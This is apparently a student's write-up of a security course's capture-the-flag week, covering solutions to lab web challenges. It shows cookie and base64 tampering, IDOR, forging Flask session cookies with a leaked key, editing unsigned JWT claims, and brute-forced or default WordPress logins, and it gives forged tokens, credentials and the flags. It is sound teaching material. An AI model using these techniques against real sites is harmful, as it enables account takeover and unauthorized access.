---
title: "Course CTF: Week 3"
date: 2020-06-15T21:20:50+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# Sales

Site: sales.-QBSITE-  

There is a cookie called `metadata` which contains `YWRtaW49MA%3D%3D`.  
This is base64 for `atob("YWRtaW49MA==") == "admin=0"`.  
We can change the cookie to `btoa("admin=1") == "YWRtaW49MQ==" => "YWRtaW49MQ%3D%3D"`.

> `COMP6443{base64isgr8.ejUyMDY2Nzc=.Dw0/uBBNn4geAk0A1mbYTw==}`

# Files - IDOR

Site: files.-QBSITE-

We are presented with a logon screen. When trying to register an account with the username 'admin', we are presented with a "Username Taken" error.  

When registering a new account, we are given a `session` cookie which contains some sort of token.  
`eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XudcFA.RU7FSQUE6K2eoTBNzuXCJ_uJrrU`

Inside this token, we see the following

```
{
  "role": {
    " b": "VXNlcg=="
  },
  "username": "andrew"
}
```

`VXNlcg==` is base64 for "User"

It's not a JWT token though... the data is in the header instead of the payload. Hmmm..

When we create a new file `test`, clicking on the link brings us to `https://files.-QBSITE-/document/test?r=YW5kcmV3` - where `YW5kcmV3` is base64 for "andrew", the username I used

We can base64 encode the `admin` username to `YWRtaW4=`.  
We can also change the filename to test (I got this purely by guessing)

`https://files.-QBSITE-/document/flag?r=YWRtaW4=`

> `COMP6443{1D0R_1S_A_TH1NG.ejUyMDY2Nzc=.3ZOEe81wa4S8G1LHOD6v4g==}`

# Files - Deprecated Admin

Site: `files.-QBSITE-/admin`  
Solution File: [files_pinBrute.py](./files_pinBrute.py)


Just a 4 digit PIN brute-force. PIN was `1024`

> `COMP6443{I_DONT_LIKE_JAVASCRIPT.ejUyMDY2Nzc=.Ku3j1HzRZy6aJZxoxxZkVg==}`

# Files - Staff

Site: files.-QBSITE-/#/staff/wfh

Elevate your user to the "Staff" role

https://files.-QBSITE-/document/staff_super_secret_file?r=c2FyYWg=

> `COMP6443{DO_U_LIKE_JAVASCRIPT.ejUyMDY2Nzc=.rO/mp2BdRVUkSo/`o50JBnA==}

# Files - You are admin!

Site: files.-QBSITE-  
Solution File: [files_secureFlask.py](./files_secureFlask.py)


Our cookie isn't a JWT tokens... it's a Secure Flask Cookie!

Inside the `staff_flask_secret_key`, we have the secret key `$hallICompareTHEE2aSummersday`

When we decode the secure cookie, we are given the dict

`decodeFlaskCookie("$hallICompareTHEE2aSummersday", "eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XudcFA.RU7FSQUE6K2eoTBNzuXCJ_uJrrU")` => `{'role': b'User', 'username': 'andrew'}`

Let's try change our name to `admin`
`encodeFlaskCookie(sk, {'role': b'User', 'username': 'admin'})` => `eyJyb2xlIjp7IiBiIjoiVlhObGNnPT0ifSwidXNlcm5hbWUiOiJhZG1pbiJ9.XuodHg.7W5ri76g_qaHArfGMJJaw9l0Les`

We can now see `flag` file from the `Files - IDOR` challenge... but surely there's more?

What if we change the role instead / as well?

`encodeFlaskCookie(sk, {'role': b'Admin', 'username': 'andrew'})` => `eyJyb2xlIjp7IiBiIjoiUVdSdGFXND0ifSwidXNlcm5hbWUiOiJhbmRyZXcifQ.XuodeQ.Bw12qnQq_LSQrOfM-G16vHJ1xNc`

Got it.

> `COMP6443{WHAT_IS_FLAAAASK.ejUyMDY2Nzc=.LSO2ev9uNfkLzHP/08LH6Q==}`

# Notes

Site: notes.-QBSITE-

When first accessed, the site generates a `notes_auth` cookie containing a JWT token.  

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6Ino1MjA2Njc3QHF1b2NjYWJhbmsuY29tIiwiZXhwIjoxNTkyMjIxMDEzfQ.NcpRWYdcRsfCmdj0KWAtgMi7PpKDhajHoHMGQ_FIE28`

This payload decodes to 

```
{
  "Username": "z5206677@-QBSITE-",
  "exp": 1592221013
}
```

The expiry time instantly lapses, giving us a "cookie expired" message on subsequent page visits.

The server doesn't verify the signature of the token, so we can modify the JWT token.  

Firstly, we can modify the expiry time of the claim.

```
{
  "Username": "z5206677@-QBSITE-",
  "exp": 2592221013
}
```

This gives us a new JWT token.  
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6Ino1MjA2Njc3QHF1b2NjYWJhbmsuY29tIiwiZXhwIjoyNTkyMjIxMDEzfQ.r5Kc2jBwK_cJLo7HcqaUqdAsCcSJN1udbmyVxYvKpR4`

When reloading the page, the server now no longer gives us the "cookie expired" message.  

We can then change the username in the claim to `admin@-QBSITE-`, which upon page reload - gives us the flag.

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6ImFkbWluQHF1b2NjYWJhbmsuY29tIiwiZXhwIjoyNTkyMjIxMDEzfQ.nbtB10X81dHfm4-dO8ysxem_Ox9Kqcep_LlbUoWg9v8`

> `COMP6443{IMAGINE_VERIFYING_SIGNATURE.ejUyMDY2Nzc=.oNwzT4yXWQmy17ZSw3DzFg==}`

# Blog - Admin Privileges

Site: blog.-QBSITE-/wp-admin/index.php

Log in to Wordpress with `admin:admin`

> `COMP6443{strongpasswordsaregreat}`

# Blog - Post

Site: blog.-QBSITE-/?page_id=2

Page crawl

> `COMP6443{hiddenpostflag}`

<!-- https://blog.-QBSITE-/?attachment_id=11 -->

# Blog - Page

Site: blog.-QBSITE-/?page_id=53  
Crawl: [blog_wpRecon.py](./blog_wpRecon.py)

Page crawl

> `COMP6443{restructuringisonthecards}`

# Blog - Header

Site: blog.-QBSITE-

In the `<meta>` tag in the HTML

> `COMP6443{ivefinallyfoundsomeone}`

# Blog - Sarah

Site: blog.-QBSITE-

`sarah:quocca`  

> `COMP6443{Ifoundsarah}`


# Blog - Timmy

Site: blog.-QBSITE-

Bruteforcing `timmy` was hard...
Bruteforcing the `mq` account though.. was trivial - and it was an admin account, which let us view all users!

> `mq:1q2w3e`
> `administrator:1q2w3e`

> `COMP6443{Ialsofoundtimmy}`
